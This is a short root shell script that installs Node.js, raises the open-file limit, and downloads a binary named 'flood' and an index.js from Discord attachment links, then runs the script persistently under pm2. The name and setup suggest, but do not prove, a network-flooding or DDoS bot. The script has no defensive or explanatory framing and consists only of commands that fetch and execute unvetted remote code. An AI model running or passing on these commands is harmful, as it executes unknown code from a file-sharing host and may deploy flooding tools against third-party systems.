apt-get update -y
apt-get install npm nodejs -y
cd /root
ulimit -n 999999
wget https://cdn.discordapp.com/attachments/863132205546733588/1043669590036709496/flood
chmod +x ./flood
npm init -y
npm i ws
npm i pm2 -g
wget https://cdn.discordapp.com/attachments/863132205546733588/1043954296816934945/index.js
pm2 start index.js
